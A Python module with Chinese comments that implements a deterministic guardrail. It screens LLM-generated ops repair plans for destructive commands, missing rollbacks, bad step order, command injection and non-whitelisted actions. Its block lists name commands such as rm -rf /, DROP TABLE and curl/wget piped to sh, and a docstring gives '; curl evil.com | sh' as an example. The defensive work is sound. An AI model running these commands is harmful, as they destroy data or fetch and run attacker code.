# ============================================================
# guardrail.py：确定性安全护栏模块
#
# 作用：
#   在修复方案执行前，用确定性代码规则检查方案的安全性，
#   拦截危险命令、缺失回滚、顺序错误、命令注入等风险。
#
# 核心设计：
#   - 不依赖 LLM 自评，纯正则/规则匹配，100% 确定性
#   - 每条规则独立，可单独测试、单独开关
#   - 输出 pass/fail + 具体违规项，不是模糊的"安全分数"
#
# 为什么需要 Guardrail？
#   LLM 可能生成危险命令（如 rm -rf /），即使 prompt 里禁止了，
#   也不能 100% 保证。Guardrail 是最后一道防线，确保危险命令不会被执行。
# ============================================================

# 模块文档字符串：说明模块用途和检查规则
"""
确定性安全护栏（Guardrail）

用确定性代码规则约束 LLM 输出边界，不依赖 LLM 自评。
这是生产级 Agent 系统的标配模式。

检查规则：
1. 危险命令黑名单：DROP TABLE、rm -rf、kill -9、DELETE FROM 不带 WHERE 等
2. 回滚完整性：高风险步骤必须有回滚命令
3. 步骤顺序合理性：先停服务再改配置，不能反过来
4. 命令注入检测：防止 LLM 生成恶意 shell 注入

设计原则：
- 每条规则是纯函数，输入步骤列表，输出违规列表
- 规则之间独立，可单独测试
- 输出是确定性的 pass/fail + 具体违规项，不是 LLM 猜的分数
"""

# re：正则表达式，用于匹配危险命令和注入模式
import re
# datetime/timezone：生成检查时间戳
from datetime import datetime, timezone
# action_dsl：结构化动作 DSL 编译器，用于验证 action_type + target 是否在白名单
from action_dsl import (
    ActionDSLValidationError,  # DSL 编译失败时抛出的异常
    compile_rollback_action,   # 编译回滚动作
    compile_step_action,       # 编译正向动作
)
# schemas：GuardrailViolation（单条违规）和 GuardrailResult（检查结果）
from schemas import GuardrailViolation, GuardrailResult
# logger：日志记录器，用于输出检查通过/失败的信息
from logger import logger


# ═══════════════════════════════════════════════════════════
# 一、规则 1：危险命令黑名单
# ═══════════════════════════════════════════════════════════

# DANGEROUS_COMMAND_PATTERNS：危险命令正则模式列表
# 每条规则是一个元组：(正则模式, 规则ID, 严重程度, 描述)
# 严重程度：critical = 不允许执行，必须修改方案
DANGEROUS_COMMAND_PATTERNS = [
    # 数据库破坏性操作
    (r"\bDROP\s+TABLE\b", "DANGEROUS_CMD_001", "critical", "包含 DROP TABLE 操作，将永久删除表数据"),
    (r"\bDROP\s+DATABASE\b", "DANGEROUS_CMD_002", "critical", "包含 DROP DATABASE 操作，将永久删除数据库"),
    (r"\bTRUNCATE\s+TABLE\b", "DANGEROUS_CMD_003", "critical", "包含 TRUNCATE TABLE 操作，将清空表数据"),
    # DELETE FROM 不带 WHERE：正则负向先行断言 (?!.*\bWHERE\b)
    # 含义：匹配 "DELETE FROM"，但后面不能跟着 "WHERE"
    (r"\bDELETE\s+FROM\b(?!.*\bWHERE\b)", "DANGEROUS_CMD_004", "critical", "DELETE FROM 不带 WHERE 条件，将删除全表数据"),
    # 文件系统破坏性操作
    (r"\brm\s+-rf\s+/", "DANGEROUS_CMD_005", "critical", "rm -rf / 将递归删除根目录，极其危险"),
    (r"\brm\s+-rf\s+~", "DANGEROUS_CMD_006", "critical", "rm -rf ~ 将递归删除用户主目录"),
    (r"\brm\s+-rf\s+\*", "DANGEROUS_CMD_007", "critical", "rm -rf * 将递归删除当前目录所有文件"),
    # 进程强制终止
    (r"\bkill\s+-9\s+1\b", "DANGEROUS_CMD_008", "critical", "kill -9 1 将强制终止 init 进程，可能导致系统崩溃"),
    (r"\bkillall\s+-9\b", "DANGEROUS_CMD_009", "critical", "killall -9 将强制终止所有匹配进程"),
    # 权限变更
    (r"\bchmod\s+777\s+/", "DANGEROUS_CMD_010", "critical", "chmod 777 / 将根目录权限设为全开放，严重安全隐患"),
    (r"\bchown\s+.*\s+/", "DANGEROUS_CMD_011", "warning", "chown 修改根目录所有者，可能影响系统安全"),
    # 网络危险操作
    (r"\biptables\s+-F\b", "DANGEROUS_CMD_012", "critical", "iptables -F 将清空所有防火墙规则"),
]


def _effective_step_command(step: dict) -> str:
    """获取步骤的有效执行命令。

    安全设计：
    - 优先使用结构化动作 DSL 编译后的命令（经过白名单校验）
    - 如果 DSL 编译失败（如 action_type 不在白名单），返回空字符串
      让后续检查跳过该步骤，因为 DSL 校验本身就会拦截非法动作
    - 如果没有定义结构化动作，回退到 step["command"] 自由文本命令

    参数：
        step：修复步骤字典

    返回：
        实际会执行的命令字符串，或空字符串
    """
    try:
        # compile_step_action：把 action_type + target 编译成实际命令
        compiled = compile_step_action(step)
        if compiled:
            return compiled.command
    except ActionDSLValidationError:
        # DSL 校验失败，返回空字符串（让调用方跳过此步骤的检查）
        return ""
    # 没有结构化动作时，回退到自由文本 command 字段
    return step.get("command", "") or ""


def _effective_rollback_command(step: dict) -> str:
    """获取步骤的有效回滚命令。

    与 _effective_step_command 对称：优先结构化 DSL，失败回退到自由文本。

    参数：
        step：修复步骤字典

    返回：
        实际会执行的回滚命令字符串，或空字符串
    """
    try:
        compiled = compile_rollback_action(step)
        if compiled:
            return compiled.command
    except ActionDSLValidationError:
        return ""
    return step.get("rollback_command", "") or ""


def check_dangerous_commands(steps: list[dict]) -> list[GuardrailViolation]:
    """检查步骤中是否包含危险命令。

    原理：对每个步骤的 command 字段做正则匹配，
    命中任何一条黑名单模式就记录一条违规。
    这是确定性的——同样的输入永远得到同样的输出。

    参数：
        steps：修复步骤列表，每个步骤含 step_id、command、risk_level 等字段

    返回：
        违规列表，空列表表示无违规
    """
    # violations：存储发现的违规项
    violations = []
    for step in steps:
        # command：获取实际会执行的命令（优先 DSL 编译结果）
        command = _effective_step_command(step)
        if not command:
            # 空命令跳过检查
            continue
        # 遍历所有危险模式，逐个匹配
        for pattern, rule_id, severity, description in DANGEROUS_COMMAND_PATTERNS:
            # re.IGNORECASE：忽略大小写匹配
            if re.search(pattern, command, re.IGNORECASE):
                # 命中黑名单，创建违规记录
                violations.append(GuardrailViolation(
                    rule_id=rule_id,
                    severity=severity,
                    step_id=step.get("step_id"),
                    message=description,
                    detail=f"步骤 {step.get('step_id', '?')} 命令匹配危险模式: {command}",
                ))
    return violations


# ═══════════════════════════════════════════════════════════
# 二、规则 2：回滚完整性检查
# ═══════════════════════════════════════════════════════════

def check_rollback_completeness(steps: list[dict]) -> list[GuardrailViolation]:
    """检查高风险步骤是否有回滚命令。

    原理：运维铁律——高风险操作必须有回滚方案。
    遍历所有步骤，risk_level 为 high 或 medium 的步骤
    如果 rollback_command 为空或无效，就记录违规。

    为什么不用 LLM 做这个检查？
    因为"有没有回滚命令"是事实判断，不是语义判断，
    确定性代码 100% 准确，LLM 可能漏判。

    参数：
        steps：修复步骤列表

    返回：
        违规列表
    """
    violations = []
    for step in steps:
        # risk：步骤风险等级，默认 low
        risk = step.get("risk_level", "low").lower()
        # 只检查 medium 和 high 风险步骤
        if risk in ("high", "medium"):
            # rollback：获取有效回滚命令
            rollback = _effective_rollback_command(step)
            # 如果回滚命令为空或无效，记录违规
            if not rollback or rollback.strip() in ("", "none", "N/A", "无"):
                violations.append(GuardrailViolation(
                    rule_id="ROLLBACK_001",
                    # high 风险缺失回滚是 critical，medium 是 warning
                    severity="critical" if risk == "high" else "warning",
                    step_id=step.get("step_id"),
                    message=f"风险等级为 {risk} 的步骤缺少回滚命令",
                    detail=f"步骤 {step.get('step_id', '?')} (risk={risk}) 缺少有效的 rollback_command",
                ))
    return violations


# ═══════════════════════════════════════════════════════════
# 三、规则 3：步骤顺序合理性检查
# ═══════════════════════════════════════════════════════════

# STEP_ORDER_CONSTRAINTS：步骤顺序约束列表
# 每条约束是一个元组：(先决动作正则, 后续动作正则, 规则ID, 描述)
# 含义：如果步骤列表中同时出现了"先决动作"和"后续动作"，
#       那么先决动作的步骤编号必须小于后续动作的步骤编号
STEP_ORDER_CONSTRAINTS = [
    # 先停服务，再启动服务
    (r"\b(stop|shutdown|kill|systemctl\s+stop)\b",
     r"\b(start|restart|systemctl\s+start|systemctl\s+restart)\b",
     "ORDER_001",
     "应先停止服务再启动，但启动步骤在停止步骤之前"),
    # 先停服务，再修改配置
    (r"\b(stop|shutdown|systemctl\s+stop)\b",
     r"\b(edit|modify|sed|vi|vim|nano|echo\s+.*>\s+)\b",
     "ORDER_002",
     "应先停止服务再修改配置，但修改配置步骤在停止服务之前"),
    # 先备份，再删除
    (r"\b(backup|cp\s+)\b",
     r"\b(rm\s|delete|DROP|TRUNCATE)\b",
     "ORDER_003",
     "应先备份再删除，但删除步骤在备份步骤之前"),
]


def check_step_order(steps: list[dict]) -> list[GuardrailViolation]:
    """检查步骤顺序是否合理。

    原理：定义一组顺序约束（先A后B），遍历步骤列表，
    如果发现 B 出现在 A 之前，就记录违规。

    举例：先停服务再改配置——如果步骤3是改配置，步骤5才是停服务，
    那就违规了。这是运维常识，用代码写死比让 LLM 判断可靠得多。

    参数：
        steps：修复步骤列表（需按 step_id 排序）

    返回：
        违规列表
    """
    violations = []
    # 先按 step_id 排序，确保顺序正确
    sorted_steps = sorted(steps, key=lambda s: s.get("step_id", 0))

    # 遍历每条顺序约束
    for prereq_pattern, subsequent_pattern, rule_id, description in STEP_ORDER_CONSTRAINTS:
        # prereq_step_id：先决动作首次出现的步骤编号
        prereq_step_id = None
        # subsequent_step_id：后续动作首次出现的步骤编号
        subsequent_step_id = None

        # 遍历排序后的步骤，查找先决动作和后续动作
        for step in sorted_steps:
            command = _effective_step_command(step)
            step_id = step.get("step_id", 0)

            # 如果还没找到先决动作，且当前命令匹配先决模式
            if prereq_step_id is None and re.search(prereq_pattern, command, re.IGNORECASE):
                prereq_step_id = step_id
            # 如果还没找到后续动作，且当前命令匹配后续模式
            if subsequent_step_id is None and re.search(subsequent_pattern, command, re.IGNORECASE):
                subsequent_step_id = step_id

        # 两个动作都存在，但后续动作出现在先决动作之前 → 违规
        if prereq_step_id is not None and subsequent_step_id is not None:
            if subsequent_step_id < prereq_step_id:
                violations.append(GuardrailViolation(
                    rule_id=rule_id,
                    severity="warning",
                    step_id=subsequent_step_id,
                    message=description,
                    detail=f"先决动作在步骤 {prereq_step_id}，但后续动作在步骤 {subsequent_step_id}",
                ))

    return violations


# ═══════════════════════════════════════════════════════════
# 四、规则 4：命令注入检测
# ═══════════════════════════════════════════════════════════

# INJECTION_PATTERNS：常见的 shell 注入模式
# 每条规则是一个元组：(正则模式, 规则ID, 严重程度, 描述)
INJECTION_PATTERNS = [
    # 管道注入：curl 下载脚本并直接执行
    (r";\s*curl\s+.*\|\s*sh\b", "INJECT_001", "critical", "检测到管道注入：通过 curl 下载并执行远程脚本"),
    # 管道注入：wget 下载脚本并直接执行
    (r";\s*wget\s+.*\|\s*(ba)?sh\b", "INJECT_002", "critical", "检测到管道注入：通过 wget 下载并执行远程脚本"),
    # 命令替换 $()：可能包含恶意命令
    (r"\$\(\s*.*\)", "INJECT_003", "warning", "检测到命令替换 $()，可能包含恶意命令"),
    # 反引号命令替换：可能包含恶意命令
    (r"`[^`]+`", "INJECT_004", "warning", "检测到反引号命令替换，可能包含恶意命令"),
    # eval/exec：动态执行字符串
    (r"\b(eval|exec)\s+", "INJECT_005", "warning", "检测到 eval/exec 调用，可能执行动态命令"),
]


def check_command_injection(steps: list[dict]) -> list[GuardrailViolation]:
    """检查步骤中是否包含命令注入风险。

    原理：LLM 生成的命令可能包含 shell 注入模式，
    比如 ; curl evil.com | sh 这种管道注入。
    用正则匹配常见注入模式，命中就告警。

    注意：warning 级别的匹配（如 $() 命令替换）不一定是恶意的，
    但在生产环境中应该人工确认。

    参数：
        steps：修复步骤列表

    返回：
        违规列表
    """
    violations = []
    for step in steps:
        command = _effective_step_command(step)
        if not command:
            continue
        for pattern, rule_id, severity, description in INJECTION_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                violations.append(GuardrailViolation(
                    rule_id=rule_id,
                    severity=severity,
                    step_id=step.get("step_id"),
                    message=description,
                    detail=f"步骤 {step.get('step_id', '?')} 命令匹配注入模式: {command}",
                ))
    return violations


# ═══════════════════════════════════════════════════════════
# 五、规则 5：Action DSL 白名单检查
# ═══════════════════════════════════════════════════════════

def check_action_dsl_allowed(steps: list[dict]) -> list[GuardrailViolation]:
    """校验结构化动作 DSL 是否在白名单内。

    这是 Guardrail 对 DSL 的专门检查：在 Executor 执行之前，
    预先验证每个步骤的正向动作和回滚动作是否都能通过 action_dsl 编译器。
    如果编译失败（ActionDSLValidationError），说明 action_type + target 组合
    不在白名单中，属于非法动作，必须拦截。

    为什么需要这个检查？
    因为 Executor 的 _resolve_step_command 也会做同样的编译，
    但 Guardrail 在 Executor 之前运行，可以在执行前就发现问题，
    避免把非法动作送到执行阶段。

    参数：
        steps：修复步骤列表

    返回：
        违规列表
    """
    violations = []
    for step in steps:
        # 分别检查正向动作和回滚动作
        for label, compiler in (
            ("action", compile_step_action),    # 正向动作编译器
            ("rollback", compile_rollback_action),  # 回滚动作编译器
        ):
            try:
                # 尝试编译，如果失败会抛出 ActionDSLValidationError
                compiler(step)
            except ActionDSLValidationError as exc:
                # 编译失败 → 不在白名单中 → 记录违规
                violations.append(GuardrailViolation(
                    rule_id="ACTION_DSL_001",
                    severity="critical",
                    step_id=step.get("step_id"),
                    message=f"结构化{label}不在白名单中",
                    detail=f"步骤 {step.get('step_id', '?')} {label}: {exc}",
                ))
    return violations


# ═══════════════════════════════════════════════════════════
# 六、护栏主入口
# ═══════════════════════════════════════════════════════════

def run_guardrail(fix_plan: dict) -> GuardrailResult:
    """执行全部护栏检查。

    流程：
    1. 从 fix_plan 中提取 steps 列表
    2. 依次执行 5 条确定性规则
    3. 汇总所有违规，只要有一条 critical 级别违规就不通过
    4. 返回 GuardrailResult（passed/failed + 违规列表）

    关键设计：
    - 规则之间独立，新增规则只需加一个 check_xxx 函数
    - 输出是确定性的，同样的 fix_plan 永远得到同样的结果
    - 不依赖 LLM，不依赖外部服务，纯本地计算

    参数：
        fix_plan：FixAgent 生成的修复方案字典，含 steps 列表

    返回：
        GuardrailResult：通过/未通过 + 违规详情
    """
    # steps：修复步骤列表
    steps = fix_plan.get("steps", [])

    # 空步骤列表直接通过（可能是占位方案）
    if not steps:
        return GuardrailResult(
            passed=True,
            violations=[],
            checked_at=datetime.now(timezone.utc).isoformat(),
        )

    # all_violations：汇总所有规则的违规
    all_violations = []

    # 依次执行 5 条规则（顺序不重要，因为规则之间独立）
    all_violations.extend(check_action_dsl_allowed(steps))    # 规则 5：DSL 白名单
    all_violations.extend(check_dangerous_commands(steps))    # 规则 1：危险命令
    all_violations.extend(check_rollback_completeness(steps)) # 规则 2：回滚完整性
    all_violations.extend(check_step_order(steps))            # 规则 3：步骤顺序
    all_violations.extend(check_command_injection(steps))     # 规则 4：命令注入

    # 只要有 critical 级别违规就不通过
    # warning 级别只提示，不阻止执行
    has_critical = any(v.severity == "critical" for v in all_violations)

    # 构造结果对象
    result = GuardrailResult(
        passed=not has_critical,
        violations=all_violations,
        checked_at=datetime.now(timezone.utc).isoformat(),
    )

    # 记录日志
    if result.passed:
        logger.info(f"[Guardrail] 检查通过，共 {len(all_violations)} 条 warning")
    else:
        critical_count = sum(1 for v in all_violations if v.severity == "critical")
        warning_count = sum(1 for v in all_violations if v.severity == "warning")
        logger.warning(
            f"[Guardrail] 检查未通过: {critical_count} 条 critical, "
            f"{warning_count} 条 warning"
        )
        # 逐条输出违规详情，方便排查
        for v in all_violations:
            logger.warning(f"  [{v.severity}] {v.rule_id}: {v.message}")

    return result
